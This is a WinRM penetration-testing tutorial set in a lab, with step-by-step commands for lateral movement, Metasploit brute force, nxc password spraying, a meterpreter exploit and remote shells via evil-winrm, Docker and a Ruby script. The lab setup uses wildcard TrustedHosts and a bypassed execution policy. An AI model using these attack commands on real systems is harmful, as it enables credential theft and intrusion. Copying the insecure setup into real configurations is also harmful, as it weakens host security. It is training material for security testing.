---
id: ckb-0c1876147506
title: WinRM Penetration Testing
category: offensive-security
format: guide
language: en
tags: [lateral-movement, metasploit, password-security, powershell, tls, windows]
license: NOASSERTION
added: 2026-10-04
classification:
  method: heuristic
  confidence: 0.8
---

WinRM Penetration Testing

                                                                                                 1 | P a g e

WinRM Penetration Testing

                                                                                                 2 | P a g e

Contents
Introduction ............................................................................................................................................ 3
Lab Setup................................................................................................................................................. 3
Execution Policy Bypass: ..................................................................................................................... 3
Enable-PSRemoting: ............................................................................................................................ 3
WinRM config:..................................................................................................................................... 3
Restart service: .................................................................................................................................... 3
Testing the connection ............................................................................................................................ 5
Lateral Movement (Locally) .................................................................................................................... 5
Connecting server using Enter-PSSession ............................................................................................... 6
Connecting server using winrs ................................................................................................................ 7
Connecting server using Powershell ....................................................................................................... 7
Lateral Movement (Remotely) ................................................................................................................ 9
Scanning .................................................................................................................................................. 9
Identifying the WinRM authentication methods .................................................................................... 9
WinRM login brute force ......................................................................................................................... 9
Password spray using nxc ...................................................................................................................... 12
Exploiting WinRM using Metasploit ...................................................................................................... 13
Connecting remote shell using docker .................................................................................................. 16
Connecting remote shell using Ruby script ........................................................................................... 16
Conclusion ............................................................................................................................................. 18

WinRM Penetration Testing

                                                                                                 3 | P a g e

Introduction
WinRM Penetration Testing plays a crucial role in assessing the security of Windows environments.
This guide further explores lateral movement, remote shell access, and exploitation techniques
using tools like PowerShell, Nmap, and Metasploit. Windows Remote Management (WinRM),
developed by Microsoft, helps users remotely manage hardware and operating systems on Windows
machines. It forms a key part of the Windows Management Framework and implements the WS-
Management Protocol, a standard web services protocol designed for remote management of
software and hardware. Notably, WS-Management uses SOAP and supports the XML schema.
WinRM communicates over port 5985 for HTTP transport and 5986 for HTTPS Transport
Lab Setup
Target Machine: Windows Server 2019 (192.168.31.70)
Standalone Individual Machine: Windows 10
Attacker Machine: Kali Linux (192.168.31.141)
To Perform lab setup, we need to enable and configure the WinRM service on both the server and an
individual machine. Here we are using the Windows 10 as an individual machine and the server as
Windows Server 2019.
First, we will configure the WinRM using PowerShell on the Windows Server 2019, the following
procedure can be used:
Execution Policy Bypass:
In order to run some scripts or perform any task the execution policy needs to be bypassed. This
method does not change the system-wide execution policy and only applies to the current
PowerShell session. Following is the command:
powershell -ep bypass
Enable-PSRemoting:
The Enable-PSRemoting cmdlet configures the computer to receive PowerShell remote commands
that are sent by using the WS-Management technology. Following is the command:
Enable-PSRemoting -force
WinRM config:
By default, WinRM listens on port 5985 for HTTP and 5986 for HTTPS.  Also, there is a flexibility to
allow connections from specific remote hosts. Here we are using the wildcard character (*) for all the
machines on the network. Following are the commands:
winrm quickconfig -transport:https
Set-Item wsman:\localhost\client\trustedhosts *
Restart service:
After the configuration is complete, now the service can be restarted using the following command:
WinRM Penetration Testing

                                                                                                 4 | P a g e

Restart-Service WinRM

There is one more configuration that we need to do is to add the administrator user in the local
group Remote Management Users.
net localgroup "Remote Management Users" /add administrator

Now to configure on the individual machine, we are going to perform the same action which we
followed in case of server configuration. It can be noticed that Enable-PSRemoting command gives an
error however the command will be executed successfully.
WinRM Penetration Testing

                                                                                                 5 | P a g e

Testing the connection
We can check the connection using test-wsman, if the connection is successful then the command
will return the version details.
test-wsman -computername "192.168.31.70"

Lateral Movement (Locally)
Since the service is active, now we can try different ways to move laterally by directly using the
WinRM service. Here we are assuming that we have already obtained the initial access in the system
as a user now we are trying to move laterally.
WinRM Penetration Testing

                                                                                                 6 | P a g e

Connecting server using Enter-PSSession
You can use the Enter-PSSession cmdlet to connect to the remote server by specifying the
ComputerName (target machine) and the Credential (trusted remote account). Once you establish
the connection, you can run system commands directly on the target.
Enter-PSSession -ComputerName 192.168.31.70 -Credential administrator
Systeminfo

WinRM Penetration Testing

                                                                                                 7 | P a g e

Connecting server using winrs
winrs is another command which uses WinRM service to connect to remote systems and execute the
commands.
winrs -r:192.168.31.70 -u:workstation\administrator -p:Ignite@987 ipconfig

It can also be used to get an interactive shell where we can run the commands afterwards directly.
winrs -r:192.168.31.70 -u:workstation\administrator -p:Ignite@987 CMD

Connecting server using Powershell
Additionally, you can connect using PowerShell Invoke-Command. Here, you must provide the host
name in the ComputerName parameter and the account name in the Credential parameter. You
should also set the Authentication type as Negotiate. When you use Negotiate, PowerShell will
initially try Kerberos authentication and, if it fails, it will switch to NTLM. However, in environments
outside a domain, providing credentials becomes essential. You can also input the command using
the ScriptBlock parameter.
Invoke-Command -ComputerName "192.168.31.70" -Credential workgroup\administrator -
Authentication Negotiate -Port 5985 -ScriptBlock {ipconfig /all}

WinRM Penetration Testing

                                                                                                 8 | P a g e

Moreover, you can create a cred object to handle credentials, where the password serves as an
argument. To create a SecureString, include the -AsPlainText and -Force parameters; otherwise, the
command will fail. Finally, you can pass this SecureString as a variable into the cred object, which
you create using the System.Management.Automation namespace and the PSCredential class.

$pass = ConvertTo-SecureString 'Ignite@987' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('workstation\administrator', $pass)
Invoke-Command -ComputerName 192.168.31.70 -Credential $cred -ScriptBlock { ipconfig }

WinRM Penetration Testing

                                                                                                 9 | P a g e

Lateral Movement (Remotely)
Scanning
To connect with the WinRM service remotely, first we need to perform the enumeration.
nmap -p5985,5986 -sV 192.168.31.70
It can be seen that the port 5985 is open and it supports the HTTP for WinRM connections.

Identifying the WinRM authentication methods
The winrm_auth_methods auxiliary in Metasploit module can be used to determine the
authentication methods. If the WinRM is supported this auxiliary will
use auxiliary/scanner/winrm/winrm_auth_methods
set rhosts 192.168.31.70
run

WinRM login brute force
The brute force on WinRM can also be performed to enumerate the successful credentials. Here we
are using the auxiliary/scanner/winrm/winrm_login inside Metasploit module. Here we are keeping
the DOMAIN as default i.e., WORKSTATION. We can specify the usernames in user_file and the
passwords in the pass_file.

WinRM Penetration Testing

                                                                                                 10 | P a g e

use auxiliary/scanner/winrm/winrm_login
set rhosts 192.168.31.70
set user_file users.txt
set pass_file pass.txt
set password N/A
run
sessions 1
Once the valid credentials are found, the session is obtained.
WinRM Penetration Testing

                                                                                                 11 | P a g e

WinRM Penetration Testing

                                                                                                 12 | P a g e

Password spray using nxc
nxc can be used to perform password spray on the WinRM service, we just need to pass the
username and password file as input.
nxc winrm 192.168.31.70 -u users.txt -p pass.txt

Once the valid username and password is obtained we can login into the remote system using evil-
winrm tool.
evil-winrm -i 192.168.31.70 -u administrator -p Ignite@987

We can also directly run the commands by giving the -x flag using nxc, after the valid credentials are
found.
nxc winrm 192.168.31.70 -u administrator -p Ignite@987 -x ipconfig

WinRM Penetration Testing

                                                                                                 13 | P a g e

Exploiting WinRM using Metasploit
Once we have found the valid credentials, we can perform command execution using the
auxiliary/scanner/winrm/winrm_cmd inside Metasploit. Following are the commands:
use auxiliary/scanner/winrm/winrm_cmd
set cmd ipconfig
set username administrator
set password Ignite@987
run

We can also take the meterpreter session, one we have the valid credentials. The
exploit/windows/winrm/winrm_script_exec can be used to execute the script. This exploit
automatically tries to perform privilege escalation by migrating to a system level process.
use exploit/windows/winrm/winrm_script_exec
set rhosts 192.168.31.70
set username administrator
set password Ignite@987
run
WinRM Penetration Testing

                                                                                                 14 | P a g e

WQL (WMI Query Language) is a specialized subset of SQL (Structured Query Language), specifically
designed for querying data within the Windows Management Instrumentation (WMI) framework.
Once you obtain valid credentials for the WinRM service, you can exploit the WMI functionality to
execute arbitrary WQL queries on the target system. Additionally, the module stores the results of
these queries as loot for later analysis.
For example, you can provide a WQL query to retrieve the Name and Status of services from the
Win32_Service class.
use auxiliary/scanner/winrm/winrm_wql
set rhosts 192.168.31.70
set username administrator
set password Ignite@987
set wql Select Name,Status from Win32_Service
run
WinRM Penetration Testing

                                                                                                 15 | P a g e

WinRM Penetration Testing

                                                                                                 16 | P a g e

Connecting remote shell using docker
We can execute a Docker image of PowerShell with NTLM support to allow for PS-Remoting from
Linux to Windows. After the connection we can supply the valid credentials and get the session
through Enter-PSSession.
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 192.168.31.70 -Authentication Negotiate -Credential $creds

Connecting remote shell using Ruby script
We can also connect to the remote server which has WinRM enabled using a ruby script. The script
can be downloaded from here:
https://raw.githubusercontent.com/Alamot/code-
snippets/master/winrm/winrm_shell_with_upload.rb
We need to modify this script by giving a valid username, password and endpoint.
cat winrm_shell_with_upload.rb
WinRM Penetration Testing

                                                                                                 17 | P a g e

WinRM Penetration Testing

                                                                                                 18 | P a g e

Once we have modified the script, we can execute it using ruby.
ruby winrm_shell_with_upload.rb
ipconfig /all

Conclusion
WinRM proves highly useful in day-to-day tasks. However, if you fail to configure it properly, attackers
can exploit it to gain shell access. Therefore, you should assign authentication permissions only to
trusted users, not to everyone.
Reference:
https://infra.newerasec.com/infrastructure-testing/enumeration/services-ports/winrm

FOLLOW US ON
FOR MORE DETAILS
CONTACT US
T W I T T E R
G I T H U B
L I N K E D I N
D I S C O R D
JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
